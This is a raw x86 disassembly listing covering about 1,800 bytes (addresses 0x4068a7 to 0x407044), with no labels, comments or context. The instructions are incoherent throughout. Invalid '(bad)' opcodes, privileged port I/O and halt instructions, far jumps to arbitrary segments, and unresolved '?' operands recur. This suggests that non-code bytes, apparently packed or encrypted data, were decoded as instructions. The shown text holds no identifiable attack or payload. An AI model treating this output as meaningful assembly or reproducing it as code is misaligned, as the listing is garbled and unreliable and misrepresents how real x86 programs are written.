  4068a7:	jmp    0xa84743c4
  4068ac:	mov    ch,0xf0
  4068ae:	pop    ecx
  4068af:	sbb    ebx,DWORD PTR fs:[ebx-0x330822c5]
  4068b6:	jecxz  0x406877
  4068b8:	(bad)  
  4068b9:	mov    ch,0x61
  4068bb:	dec    ebp
  4068bc:	push   es
  4068bd:	jbe    0x4068f4
  4068bf:	sbb    DWORD PTR [edi-0x490496e0],esp
  4068c5:	pop    edi
  4068c6:	gs retf 0x3e0a
  4068ca:	popf   
  4068cb:	hlt    
  4068cc:	pop    ss
  4068cd:	cmp    ecx,edi
  4068cf:	xchg   ebp,eax
  4068d0:	mov    BYTE PTR [edi],bh
  4068d2:	ror    DWORD PTR [ecx-0x2c],0xe1
  4068d6:	dec    ecx
  4068d7:	imul   esi,ecx,0xbf8f6fac
  4068dd:	retf   
  4068de:	jnp    0x40689f
  4068e0:	sar    bl,0xf5
  4068e3:	sbb    cl,BYTE PTR [edx]
  4068e5:	and    eax,0x726cd4b3
  4068ea:	push   esi
  4068eb:	les    eax,FWORD PTR [esi+0xc]
  4068ee:	out    0x9b,eax
  4068f0:	clc    
  4068f1:	cmp    eax,0x5f7da90e
  4068f6:	xor    eax,0xf4ebb86b
  4068fb:	sbb    al,0x3
  4068fd:	je     0x4068b6
  4068ff:	xchg   edx,eax
  406900:	(bad)  
  406901:	icebp  
  406902:	jge    0x4068d4
  406904:	add    edi,ebp
  406906:	xchg   ebx,eax
  406907:	sbb    esi,DWORD PTR es:[esi-0x6fdbe98e]
  40690e:	jnp    0x40691d
  406910:	sub    BYTE PTR [ecx],dh
  406912:	daa    
  406913:	mov    ah,0x76
  406915:	mov    bh,0x6b
  406917:	rol    dl,0x4
  40691a:	jmp    0x406951
  40691c:	retf   
  40691d:	sub    eax,0x40b5680
  406922:	arpl   bp,cx
  406924:	mov    bl,dh
  406926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406927:	dec    esp
  406928:	shl    DWORD PTR [ebp+0x5f],1
  40692b:	ret    0xf356
  40692e:	cmc    
  40692f:	xor    cl,BYTE PTR [edx]
  406931:	aam    0xaf
  406933:	ins    DWORD PTR es:[edi],dx
  406934:	push   0xffffffd3
  406936:	pop    ds
  406937:	loopne 0x406925
  406939:	dec    ecx
  40693a:	adc    ebx,0x5c40e347
  406940:	outs   dx,DWORD PTR ds:[esi]
  406941:	es ds arpl ax,sp
  406945:	mov    esi,0x49a7a3a
  40694a:	dec    ecx
  40694b:	cs sbb al,0xc8
  40694e:	pop    esp
  40694f:	aad    0x86
  406951:	sbb    BYTE PTR [ebx-0x5e],dl
  406954:	(bad)  [ebx-0x5d]
  406957:	push   0x62
  406959:	cmp    dh,BYTE PTR [ecx]
  40695b:	mov    BYTE PTR [eax+ebx*1],cl
  40695e:	out    dx,al
  40695f:	add    al,0xe0
  406961:	xlat   BYTE PTR ds:[ebx]
  406962:	xchg   BYTE PTR [eax-0x429b20d8],dl
  406968:	pushf  
  406969:	adc    DWORD PTR [esi+0x71edaa39],ebx
  40696f:	rcl    BYTE PTR [eax+0x5ab6a50c],cl
  406975:	dec    esi
  406976:	push   ebx
  406977:	mov    bh,0x7b
  406979:	and    BYTE PTR [esp+edx*8-0x7f],dh
  40697d:	je     0x406987
  40697f:	push   es
  406980:	cmc    
  406981:	jp     0x406917
  406983:	push   eax
  406984:	mov    BYTE PTR [edx*1+0x7390b5b7],dl
  40698b:	fmul   QWORD PTR [edi+0x33]
  40698e:	pop    ss
  40698f:	inc    ecx
  406990:	les    ebx,FWORD PTR [ecx+0x3]
  406993:	and    al,0x38
  406995:	sub    DWORD PTR [edx+0x1c],0x54f35e2
  40699c:	fcmovnb st,st(7)
  40699e:	xchg   edi,eax
  40699f:	cwde   
  4069a0:	(bad)  
  4069a1:	sub    al,0x84
  4069a3:	xchg   ecx,eax
  4069a4:	scas   eax,DWORD PTR es:[edi]
  4069a5:	fnsave [eax*1+0x40367155]
  4069ac:	loope  0x4069b3
  4069ae:	inc    eax
  4069af:	add    edx,DWORD PTR [esi]
  4069b1:	adc    DWORD PTR [edx+0x66b78811],eax
  4069b7:	or     cl,BYTE PTR [esi]
  4069b9:	xchg   edx,eax
  4069ba:	dec    ebx
  4069bb:	sahf   
  4069bc:	ins    BYTE PTR es:[edi],dx
  4069bd:	cmp    bl,BYTE PTR [esi-0xe]
  4069c0:	sub    ecx,DWORD PTR [ebx]
  4069c2:	mov    edi,0xbb9a330
  4069c7:	add    BYTE PTR [ecx],0x92
  4069ca:	jl     0x406a47
  4069cc:	xor    bl,BYTE PTR [ecx]
  4069ce:	mov    ah,0xc5
  4069d0:	sbb    edi,ebp
  4069d2:	sti    
  4069d3:	add    eax,0xb6cd42c
  4069d8:	inc    esp
  4069d9:	div    ch
  4069db:	cwde   
  4069dc:	into   
  4069dd:	mov    bh,0x35
  4069df:	enter  0x51d0,0xa3
  4069e3:	mov    bh,0x0
  4069e5:	bound  esp,QWORD PTR [edx]
  4069e7:	dec    esp
  4069e8:	cmp    DWORD PTR [ebp+eax*1-0x5b],0x5
  4069ed:	sub    eax,0x69ab1c20
  4069f2:	call   0x8c42:0x91a852ed
  4069f9:	div    bl
  4069fb:	mov    al,0xb5
  4069fd:	inc    esp
  4069fe:	or     DWORD PTR [esi-0x1faa2936],ecx
  406a04:	add    eax,0xd8c8a06e
  406a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a0a:	in     al,dx
  406a0b:	xchg   edx,eax
  406a0c:	jb     0x4069ad
  406a0e:	int3   
  406a0f:	xor    dl,BYTE PTR [ecx]
  406a11:	push   cs
  406a12:	ficom  WORD PTR [eax+0x72]
  406a15:	arpl   WORD PTR ds:0x66007796,dx
  406a1b:	add    DWORD PTR [edi+0x6b],ecx
  406a1e:	mov    BYTE PTR [ebx+ecx*1-0x6e],dh
  406a22:	sbb    BYTE PTR [ecx+0x4f],bl
  406a25:	adc    BYTE PTR [eax],0x71
  406a28:	out    0xbe,eax
  406a2a:	mov    eax,0xa51e916e
  406a2f:	in     al,dx
  406a30:	gs aaa 
  406a32:	sub    al,BYTE PTR [edi]
  406a34:	lods   al,BYTE PTR ds:[esi]
  406a35:	jnp    0x406a22
  406a37:	xchg   ecx,eax
  406a38:	or     ecx,DWORD PTR [eax]
  406a3a:	call   0xa493:0x88d9075
  406a41:	cwde   
  406a42:	jp     0x4069c5
  406a44:	sbb    dh,BYTE PTR [edx+ecx*2-0x6e98406b]
  406a4b:	add    al,0x24
  406a4d:	repz test DWORD PTR [eax-0x77],ebp
  406a51:	add    ch,ch
  406a53:	add    DWORD PTR [edi],0x88a8877b
  406a59:	pop    ecx
  406a5a:	jae    0x4069ea
  406a5c:	and    DWORD PTR [esi+edx*4-0x44cca90d],eax
  406a63:	and    eax,0x288db725
  406a68:	ds ss out dx,eax
  406a6b:	scas   al,BYTE PTR es:[edi]
  406a6c:	out    0x34,eax
  406a6e:	push   edi
  406a6f:	jnp    0x406a7c
  406a71:	cmp    edx,ebp
  406a73:	push   ebp
  406a74:	div    BYTE PTR [ebx-0x4748307d]
  406a7a:	mov    ds:0xb1a94a9f,eax
  406a7f:	rol    DWORD PTR [eax+0x79],cl
  406a82:	fisub  DWORD PTR [eax]
  406a84:	push   edi
  406a85:	fst    QWORD PTR [ebx-0x63]
  406a88:	mov    edi,0x578ee567
  406a8d:	gs loopne 0x406a5d
  406a90:	sbb    BYTE PTR [ebp-0xaceffd6],dl
  406a96:	fist   DWORD PTR [ebx+0x58]
  406a99:	ins    BYTE PTR es:[edi],dx
  406a9a:	or     edi,0x7eca25c6
  406aa0:	push   ebx
  406aa1:	jb     0x406a53
  406aa3:	popa   
  406aa4:	into   
  406aa5:	ror    BYTE PTR [ebp+0x7762827d],1
  406aab:	lds    ebx,FWORD PTR [edi+esi*2-0x4582bd9e]
  406ab2:	sbb    eax,0x8b598596
  406ab7:	xor    BYTE PTR [edx-0x35],0xa5
  406abb:	and    DWORD PTR [edx-0x57ced8f4],esp
  406ac1:	(bad)  
  406ac2:	in     al,dx
  406ac3:	mov    WORD PTR [ecx],gs
  406ac5:	call   0x23d1:0x417a2597
  406acc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ace:	cwde   
  406acf:	loope  0x406b2d
  406ad1:	dec    eax
  406ad2:	scas   eax,DWORD PTR es:[edi]
  406ad3:	and    cl,dl
  406ad5:	sub    esp,DWORD PTR [edx]
  406ad7:	push   edi
  406ad8:	imul   ebp,DWORD PTR [esp+edi*1],0x117895a6
  406adf:	mov    al,0xd8
  406ae1:	fisttp QWORD PTR [ecx]
  406ae3:	inc    eax
  406ae4:	xor    BYTE PTR [eax],bl
  406ae6:	inc    esp
  406ae7:	jmp    0x3757e48f
  406aec:	mov    ah,0x47
  406aee:	fisub  DWORD PTR [eax+0xf]
  406af1:	adc    ebx,DWORD PTR [ebp+0x66]
  406af4:	inc    eax
  406af5:	or     eax,0xf5bdb3f1
  406afa:	mov    edx,0x73edee18
  406aff:	cdq    
  406b00:	xchg   esp,eax
  406b01:	pop    esi
  406b02:	cmp    BYTE PTR [edi-0x72be39b0],bl
  406b08:	dec    eax
  406b09:	(bad)  
  406b0a:	pusha  
  406b0b:	cmc    
  406b0c:	fistp  DWORD PTR [edx-0xdc4ff42]
  406b12:	icebp  
  406b13:	adc    bl,dl
  406b15:	leave  
  406b16:	popf   
  406b17:	dec    edx
  406b18:	lods   eax,DWORD PTR ds:[esi]
  406b19:	xchg   BYTE PTR [ebx],dl
  406b1b:	push   ss
  406b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b1d:	mov    bl,BYTE PTR [eax-0x44194451]
  406b23:	stc    
  406b24:	mov    al,ds:0x3d8236cd
  406b29:	repz (bad) 
  406b2b:	xlat   BYTE PTR ds:[ebx]
  406b2c:	int    0xc9
  406b2e:	outs   dx,DWORD PTR ds:[esi]
  406b2f:	cmp    DWORD PTR [eax-0x56a36060],0x91ec9dc4
  406b39:	pop    ebx
  406b3a:	and    eax,0x1717a2a9
  406b3f:	(bad)  
  406b40:	fmul   QWORD PTR [esi+eax*1]
  406b43:	(bad)  
  406b44:	clc    
  406b45:	push   cs
  406b46:	push   esp
  406b47:	cld    
  406b48:	inc    edi
  406b49:	jmp    0x406ba2
  406b4b:	jb     0x406bbb
  406b4d:	xchg   esi,eax
  406b4e:	push   ebp
  406b4f:	fucom  st(1)
  406b51:	sti    
  406b52:	ror    BYTE PTR [ebx],cl
  406b54:	inc    ebx
  406b55:	sbb    BYTE PTR [edx],ah
  406b57:	pop    ss
  406b58:	dec    eax
  406b59:	in     al,0xa9
  406b5b:	shl    BYTE PTR [ebp+0x24a0d9f9],1
  406b61:	adc    BYTE PTR [edx+0x32],0x67
  406b65:	xchg   ecx,eax
  406b66:	or     dh,ch
  406b68:	xchg   BYTE PTR [edi+0x70],al
  406b6b:	push   edi
  406b6c:	and    DWORD PTR [esi+0x4d],0x32ccf33d
  406b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b74:	in     eax,dx
  406b75:	sbb    cl,bl
  406b77:	sbb    al,0xfd
  406b79:	dec    edi
  406b7a:	push   edi
  406b7b:	adc    DWORD PTR [eax],eax
  406b7d:	jnp    0x406bc9
  406b7f:	(bad)  
  406b80:	jae    0x406b0d
  406b82:	call   0xa19a3b4b
  406b87:	push   ss
  406b88:	cmp    ebp,DWORD PTR [ebp-0x51ae5239]
  406b8e:	adc    bl,BYTE PTR [eax]
  406b90:	push   ecx
  406b91:	sbb    BYTE PTR [eax+0x54],0x15
  406b95:	push   0xffffff8d
  406b97:	pop    edi
  406b98:	aaa    
  406b99:	jl     0x406c18
  406b9b:	push   0x72be04c
  406ba0:	mov    dh,0xd2
  406ba2:	cmp    DWORD PTR [esi],0xae319774
  406ba8:	push   es
  406ba9:	jne    0x406bc0
  406bab:	into   
  406bac:	das    
  406bad:	push   eax
  406bae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406baf:	mov    eax,0xfa81c2c4
  406bb4:	and    BYTE PTR [esi-0x7a],dh
  406bb7:	jmp    0x406b4d
  406bb9:	xchg   ecx,eax
  406bba:	out    0x14,eax
  406bbc:	sub    BYTE PTR gs:[edi+0x3ab7bc2],bl
  406bc3:	rol    DWORD PTR [eax],1
  406bc5:	dec    esi
  406bc6:	jb     0x406bc2
  406bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bc9:	push   eax
  406bca:	jbe    0x406bca
  406bcc:	mov    eax,0xbebf0cfd
  406bd1:	jge    0x406bda
  406bd3:	outs   dx,DWORD PTR es:[esi]
  406bd5:	sti    
  406bd6:	xor    ah,dl
  406bd8:	jae    0x406bac
  406bda:	mov    ch,0xcb
  406bdc:	jg     0x406b65
  406bde:	daa    
  406bdf:	lds    esp,FWORD PTR [ecx+0x76bd568b]
  406be5:	les    ebx,FWORD PTR [ebp-0xb]
  406be8:	scas   eax,DWORD PTR es:[edi]
  406be9:	int3   
  406bea:	pop    ss
  406beb:	dec    ebx
  406bec:	repz out 0xb,al
  406bef:	adc    eax,0x2770c343
  406bf4:	ja     0x406beb
  406bf6:	(bad)  
  406bf9:	aas    
  406bfa:	and    eax,0x59db9a34
  406bff:	les    edx,FWORD PTR [ebx-0x595924d]
  406c05:	mov    ds:0x387e6026,eax
  406c0a:	jnp    0x406b9c
  406c0c:	popf   
  406c0d:	mov    ebx,0xbcc21261
  406c12:	lock sub eax,0xedc6e551
  406c18:	push   cs
  406c19:	(bad)  
  406c1a:	(bad)  
  406c1c:	xlat   BYTE PTR ds:[ebx]
  406c1d:	iret   
  406c1e:	outs   dx,DWORD PTR ds:[esi]
  406c1f:	loopne 0x406c6d
  406c21:	mov    al,0x3b
  406c23:	(bad)  
  406c24:	(bad)  [edx]
  406c26:	xor    ecx,0x8cf90f2e
  406c2c:	add    bh,al
  406c2e:	sbb    al,0xb9
  406c30:	pop    ebx
  406c31:	adc    al,0xf1
  406c33:	cdq    
  406c34:	pusha  
  406c35:	xchg   ebx,eax
  406c36:	sbb    eax,0x63d2bdd5
  406c3b:	mov    ?,edi
  406c3d:	jmp    0x877b:0x4b652f4
  406c44:	daa    
  406c45:	sbb    dl,BYTE PTR [esi+0x4f]
  406c48:	dec    ecx
  406c49:	push   ebx
  406c4a:	lock shr DWORD PTR [edx],cl
  406c4d:	dec    ebx
  406c4e:	cmp    edi,0xacf89654
  406c54:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  406c56:	sub    dl,BYTE PTR [esi-0x21]
  406c59:	pop    ebp
  406c5a:	pop    esi
  406c5b:	push   es
  406c5c:	push   esi
  406c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c5e:	div    DWORD PTR [ecx+0x460a5a65]
  406c64:	mov    eax,ds:0x1a956394
  406c69:	mov    ds:0xc05bee4a,al
  406c6e:	call   0xf9c6a148
  406c73:	jno    0x406c89
  406c75:	sbb    BYTE PTR [edx-0x78],al
  406c78:	test   DWORD PTR [eax+0x6e],esi
  406c7b:	mov    al,0x1
  406c7d:	cs sbb cl,cl
  406c80:	test   eax,0xa74d61f7
  406c85:	mov    eax,ds:0x761eb4fa
  406c8a:	fld    TBYTE PTR [edx+0x2d]
  406c8d:	xchg   ecx,eax
  406c8e:	inc    esp
  406c8f:	(bad)  
  406c90:	fst    QWORD PTR [ebp+0x47]
  406c93:	arpl   WORD PTR [ebp+ebx*2+0x62282823],sp
  406c9a:	add    DWORD PTR [edx],edi
  406c9c:	dec    edi
  406c9d:	daa    
  406c9e:	mov    edi,0xb73c25f0
  406ca3:	adc    ah,BYTE PTR [ebx+0x71be94c4]
  406ca9:	addr16 sub eax,0x932c81fd
  406caf:	aaa    
  406cb0:	push   es
  406cb1:	shr    DWORD PTR [esp+eiz*2],1
  406cb4:	xor    al,0xf6
  406cb6:	leave  
  406cb7:	inc    ebp
  406cb8:	jecxz  0x406c4d
  406cba:	retf   0x7a9b
  406cbd:	std    
  406cbe:	fcom   QWORD PTR [ecx-0x771b89ff]
  406cc4:	sbb    ecx,esi
  406cc6:	iret   
  406cc7:	cdq    
  406cc8:	push   eax
  406cc9:	out    0x9e,al
  406ccb:	sbb    BYTE PTR [edx],0x91
  406cce:	arpl   WORD PTR [eax-0x41a9b420],bp
  406cd4:	stos   BYTE PTR es:[edi],al
  406cd5:	sub    ah,al
  406cd7:	fidivr WORD PTR [ecx+0x41a44255]
  406cdd:	cli    
  406cde:	loopne 0x406ce3
  406ce0:	mov    eax,ds:0x495ae638
  406ce5:	or     ebp,edi
  406ce7:	ins    BYTE PTR es:[edi],dx
  406ce8:	scas   al,BYTE PTR es:[edi]
  406ce9:	xchg   ecx,eax
  406cea:	push   edi
  406ceb:	das    
  406cec:	jbe    0x406ce8
  406cee:	pop    esi
  406cef:	pop    esp
  406cf0:	pop    esi
  406cf1:	and    BYTE PTR [ecx],0x98
  406cf4:	xor    ah,dh
  406cf6:	dec    esi
  406cf7:	pop    eax
  406cf8:	inc    ebx
  406cf9:	(bad)  
  406cfa:	retf   
  406cfb:	hlt    
  406cfc:	mov    ecx,DWORD PTR [esi+edx*8-0x73d65fd1]
  406d03:	(bad)  
  406d04:	test   eax,0xf0385815
  406d09:	inc    ecx
  406d0a:	xchg   BYTE PTR [ebx+eiz*1-0xa97e8d9],dh
  406d11:	(bad)  
  406d12:	push   edi
  406d13:	mov    ebp,0xc6c60b7d
  406d18:	sub    DWORD PTR [ebp+edx*8+0x23cc7281],0x4f62c843
  406d23:	enter  0x7bbb,0xeb
  406d27:	jmp    0x6d6b4dc3
  406d2c:	in     al,0x82
  406d2e:	adc    al,0x87
  406d30:	adc    dh,bh
  406d32:	dec    eax
  406d33:	es mov ecx,0x6eb6fdc8
  406d39:	aas    
  406d3a:	and    DWORD PTR [ecx+edi*2-0x3d64c853],0x1ddd21e8
  406d45:	or     DWORD PTR [esi+ebx*4],ebp
  406d48:	pop    ebx
  406d49:	repnz or BYTE PTR [ebx],ah
  406d4c:	mov    esi,?
  406d4e:	dec    edi
  406d4f:	pushf  
  406d50:	xchg   DWORD PTR [esi+ecx*1+0x4f],ecx
  406d54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d55:	inc    ebp
  406d56:	ds cld 
  406d58:	adc    DWORD PTR [esi+0x64],esi
  406d5b:	sbb    eax,0x5f1dd5de
  406d60:	test   eax,0x82c82574
  406d65:	cmp    BYTE PTR [esi-0x442cad0e],0x33
  406d6c:	repnz les ebp,FWORD PTR [eax]
  406d6f:	pop    edi
  406d70:	xchg   esp,eax
  406d71:	pop    ds
  406d72:	je     0x406d4d
  406d74:	pop    es
  406d75:	jg     0x406d49
  406d77:	add    DWORD PTR [eax],0x9114c2e
  406d7d:	mov    esp,0x5452b574
  406d82:	sub    BYTE PTR [ebp-0x2b2dff6b],dl
  406d88:	xor    edx,ebx
  406d8a:	add    bl,BYTE PTR [ebx]
  406d8c:	sbb    edi,DWORD PTR [ebx+0x63]
  406d8f:	lds    esp,FWORD PTR [esi]
  406d91:	ret    0xaefb
  406d94:	(bad)  
  406d95:	scas   eax,DWORD PTR es:[edi]
  406d96:	dec    esp
  406d97:	inc    esi
  406d98:	fnstsw WORD PTR [esi+eiz*1-0x114bd394]
  406d9f:	fcom   DWORD PTR [ecx+edx*2-0x30aa2eab]
  406da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406da7:	ret    0x9484
  406daa:	test   DWORD PTR [eax+0x3e5ac071],ebx
  406db0:	jne    0x406dc7
  406db2:	jno    0x406d6d
  406db4:	iret   
  406db5:	or     eax,0xeec68171
  406dba:	and    esp,edx
  406dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dbd:	inc    esi
  406dbe:	inc    edi
  406dbf:	mov    BYTE PTR [edi+0x47d4e473],cl
  406dc5:	mov    eax,ds:0xd28c6e4c
  406dca:	add    DWORD PTR [edx],0xffffff8f
  406dcd:	jb     0x406db5
  406dcf:	mov    ebx,0xe612d17c
  406dd4:	mov    ?,WORD PTR [ebp+0x285768be]
  406dda:	loop   0x406d86
  406ddc:	add    bl,BYTE PTR [ebp-0x247c207e]
  406de2:	stos   BYTE PTR es:[edi],al
  406de3:	and    DWORD PTR [ecx-0x1ab47071],esi
  406de9:	push   cs
  406dea:	lock ds and al,0x90
  406dee:	hlt    
  406def:	addr16 dec ecx
  406df1:	jnp    0x406d88
  406df3:	xchg   ebp,eax
  406df4:	test   esi,ebx
  406df6:	ret    0xc88d
  406df9:	mov    ebp,0x8414035
  406dfe:	(bad)  
  406dff:	inc    eax
  406e00:	outs   dx,DWORD PTR ds:[esi]
  406e01:	div    BYTE PTR [eax+ebx*8-0x40]
  406e05:	ins    DWORD PTR es:[edi],dx
  406e06:	out    0xd5,eax
  406e08:	xor    eax,ecx
  406e0a:	shl    bh,cl
  406e0c:	popa   
  406e0d:	or     BYTE PTR [eax-0x48],ah
  406e10:	add    DWORD PTR [edi],edx
  406e12:	inc    esi
  406e13:	mov    al,ds:0x944711fe
  406e18:	int3   
  406e19:	cld    
  406e1a:	(bad)  
  406e1b:	sahf   
  406e1c:	mov    DWORD PTR [eax+0xb3a7ac2],ebp
  406e22:	dec    edi
  406e23:	cdq    
  406e24:	out    dx,al
  406e25:	jmp    0x36d4:0xa8f6c9ad
  406e2c:	and    eax,0x2dbe5085
  406e31:	adc    al,0xfe
  406e33:	scas   al,BYTE PTR es:[edi]
  406e34:	jecxz  0x406e19
  406e36:	and    esp,edi
  406e38:	and    DWORD PTR [esi],ecx
  406e3a:	mov    DWORD PTR [eax-0x6a],ebx
  406e3d:	cmp    al,0x6e
  406e3f:	push   ecx
  406e40:	rol    DWORD PTR [edi+0x7a59b6f6],0x78
  406e47:	cmp    al,0x17
  406e49:	mov    bh,0xf8
  406e4b:	xchg   esi,eax
  406e4c:	loop   0x406e4d
  406e4e:	pop    ss
  406e4f:	jnp    0x406ea8
  406e51:	jmp    0xd3b4:0x6b57b388
  406e58:	pop    ebx
  406e59:	lds    eax,FWORD PTR [ebp+eiz*2+0x7fb58d1c]
  406e60:	jge    0x406e23
  406e62:	and    DWORD PTR [edx-0xf46755d],esi
  406e68:	jae    0x406ebc
  406e6a:	gs stos BYTE PTR es:[edi],al
  406e6c:	stc    
  406e6d:	sbb    DWORD PTR [ecx+0x2b5640e],ebx
  406e73:	ins    BYTE PTR es:[edi],dx
  406e74:	(bad)
  406e77:	jg     0x406e72
  406e79:	hlt    
  406e7a:	not    BYTE PTR [ebx-0x21]
  406e7d:	addr16 test al,0xfa
  406e80:	(bad)  
  406e81:	cmp    eax,0xeb3d138c
  406e86:	inc    eax
  406e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e88:	ret    0x86a0
  406e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e8c:	jge    0x406ebc
  406e8e:	sti    
  406e8f:	mov    cl,BYTE PTR [edi]
  406e91:	and    al,0x3b
  406e93:	and    dh,BYTE PTR [edi+0x54]
  406e96:	(bad)  ds:0xc7d9bc1d
  406e9c:	int    0x8d
  406e9e:	daa    
  406e9f:	aaa    
  406ea0:	pop    ss
  406ea1:	cld    
  406ea2:	pop    ebx
  406ea3:	fld    DWORD PTR [ebx+0x4a]
  406ea6:	sbb    ebp,DWORD PTR [ecx]
  406ea8:	aas    
  406ea9:	(bad)  
  406eab:	sub    DWORD PTR [edi-0x78],0xffffffed
  406eaf:	or     edi,DWORD PTR [edx-0x69]
  406eb2:	mov    cl,0xe1
  406eb4:	popa   
  406eb5:	or     eax,0x50328c7e
  406eba:	sub    eax,0x8ce7e25a
  406ebf:	fld    DWORD PTR [ebx]
  406ec1:	inc    esi
  406ec2:	sub    esi,DWORD PTR [ecx-0x796a892a]
  406ec8:	stos   DWORD PTR es:[edi],eax
  406ec9:	enter  0x2493,0xe
  406ecd:	push   ds
  406ece:	outs   dx,BYTE PTR ds:[esi]
  406ecf:	mov    al,ds:0xab8100f7
  406ed4:	hlt    
  406ed5:	addr16 ja 0x406e9f
  406ed8:	ds xor al,0xd4
  406edb:	or     al,al
  406edd:	dec    ecx
  406ede:	mov    cl,0xa5
  406ee0:	mov    DWORD PTR [esi+0x7af020e9],ecx
  406ee6:	sbb    eax,0xf67b97e4
  406eeb:	repz enter 0xb979,0xb3
  406ef0:	arpl   dx,bx
  406ef2:	int3   
  406ef3:	ins    DWORD PTR es:[edi],dx
  406ef4:	adc    eax,0xa175929b
  406ef9:	out    dx,eax
  406efa:	jnp    0x406ec2
  406efc:	sub    BYTE PTR [ebx-0x69efc912],0xbf
  406f03:	fs verw cx
  406f07:	bswap  eax
  406f09:	adc    al,0xaf
  406f0b:	arpl   WORD PTR [edx-0x5e],sp
  406f0e:	mov    dh,0xd8
  406f10:	cmp    eax,DWORD PTR [ebx-0x10]
  406f13:	stos   DWORD PTR es:[edi],eax
  406f14:	loope  0x406f28
  406f16:	pop    esi
  406f17:	outs   dx,DWORD PTR ds:[esi]
  406f18:	mov    ah,BYTE PTR [edx]
  406f1a:	jo     0x406ebb
  406f1c:	sahf   
  406f1d:	sbb    DWORD PTR [edx-0x35b8db5c],0x65f2d2c3
  406f27:	loopne 0x406ed9
  406f29:	cmp    al,0x4a
  406f2b:	jo     0x406fa6
  406f2d:	xchg   ebp,eax
  406f2e:	sbb    esi,eax
  406f30:	jp     0x406ef5
  406f32:	add    DWORD PTR [edx+ecx*4-0x6e],esp
  406f36:	push   esi
  406f37:	or     dl,ah
  406f39:	cmp    BYTE PTR [edx-0x67],0x60
  406f3d:	cdq    
  406f3e:	and    DWORD PTR [ebp+0x4a],esi
  406f41:	mov    eax,ds:0x30aff0c2
  406f46:	clc    
  406f47:	sub    al,0x78
  406f49:	fisubr DWORD PTR [ebp+0xdd086b7]
  406f4f:	aas    
  406f50:	jne    0x406f07
  406f52:	sbb    eax,0xec09091d
  406f57:	lea    edi,[ecx-0x3e]
  406f5a:	mov    ?,WORD PTR [eax+0x24]
  406f5d:	jp     0x406f3e
  406f5f:	dec    esp
  406f60:	je     0x406eec
  406f62:	cmp    eax,0xe85b1379
  406f67:	push   ss
  406f68:	push   ds
  406f69:	pop    eax
  406f6a:	mov    dh,0x4c
  406f6c:	ja     0x406f04
  406f6e:	pop    edx
  406f6f:	call   DWORD PTR [eax-0x10c10489]
  406f75:	call   0x38d0:0x4f872048
  406f7c:	xchg   ebp,eax
  406f7d:	xchg   ebx,eax
  406f7e:	inc    esi
  406f7f:	add    edi,DWORD PTR [edi-0x31]
  406f82:	push   esp
  406f83:	clc    
  406f84:	mov    ebp,0x7a79ce1a
  406f89:	ja     0x406fd5
  406f8b:	mov    bh,bh
  406f8d:	jnp    0x406fb1
  406f8f:	mov    ecx,0xbec29de8
  406f94:	out    dx,al
  406f95:	sbb    eax,0x6711ddaf
  406f9a:	jne    0x406f9b
  406f9c:	or     BYTE PTR [ecx+0x49],cl
  406f9f:	or     BYTE PTR [edi],0xe8
  406fa2:	pop    ebx
  406fa3:	pop    eax
  406fa4:	sahf   
  406fa5:	ja     0x406f68
  406fa7:	sar    ecx,0x67
  406faa:	ins    BYTE PTR es:[edi],dx
  406fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fac:	les    eax,FWORD PTR [ebx]
  406fae:	test   eax,0x69284a57
  406fb3:	ficomp DWORD PTR [ebx-0x152a0186]
  406fb9:	sub    DWORD PTR [ebx],0x14
  406fbc:	in     eax,0x89
  406fbe:	and    DWORD PTR [ecx+0x9d3380],esp
  406fc4:	out    0x97,eax
  406fc6:	jmp    0x406f87
  406fc8:	or     DWORD PTR [edx],edx
  406fca:	(bad)  
  406fcb:	(bad)  
  406fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fcd:	xor    DWORD PTR [ecx+0x6ea9102],esp
  406fd3:	(bad)  
  406fd6:	mov    ah,0x2b
  406fd8:	jnp    0x407047
  406fda:	sub    ah,BYTE PTR [ebx+0x10]
  406fdd:	xchg   edx,eax
  406fde:	pop    ss
  406fdf:	stc    
  406fe0:	fwait
  406fe1:	dec    eax
  406fe2:	and    edx,esp
  406fe4:	pop    ebp
  406fe5:	stc    
  406fe6:	xchg   DWORD PTR [eax+0x29],edx
  406fe9:	mov    al,0x30
  406feb:	jbe    0x406f83
  406fed:	mov    ecx,ebp
  406fef:	into   
  406ff0:	sub    BYTE PTR [ebx-0x4a],bh
  406ff3:	pop    esp
  406ff4:	in     al,dx
  406ff5:	popf   
  406ff6:	sbb    dh,BYTE PTR [eax]
  406ff8:	sub    BYTE PTR [eax+0x4b],0x9a
  406ffc:	fisub  DWORD PTR ds:0x2d2d4fb6
  407002:	push   0x4d
  407004:	mov    bl,BYTE PTR [edx-0x13a7de82]
  40700a:	(bad)  
  40700b:	mov    edx,0xff0c56d7
  407010:	mov    ebx,ecx
  407012:	jl     0x407090
  407014:	add    esp,DWORD PTR [ecx+0x56]
  407017:	nop
  407018:	aas    
  407019:	call   0xd71e1ea3
  40701e:	in     al,dx
  40701f:	push   es
  407020:	mov    al,0xf5
  407022:	arpl   WORD PTR [ecx+0x3d],sp
  407025:	and    cl,BYTE PTR [eax+0x2d3df1f]
  40702b:	out    0x80,al
  40702d:	lahf   
  40702e:	inc    esi
  40702f:	push   esp
  407030:	scas   eax,DWORD PTR es:[edi]
  407031:	test   DWORD PTR [ebx+eiz*1],ecx
  407034:	cmp    BYTE PTR [ecx+0x3],bh
  407037:	aaa    
  407038:	mov    bl,0x71
  40703a:	ret    0xbf4c
  40703d:	and    DWORD PTR [ebp+0x6a7a6ff7],esi
  407043:	lods   eax,DWORD PTR ds:[esi]
  407044:	sar    DWORD PTR [edi+0x4e],0x66
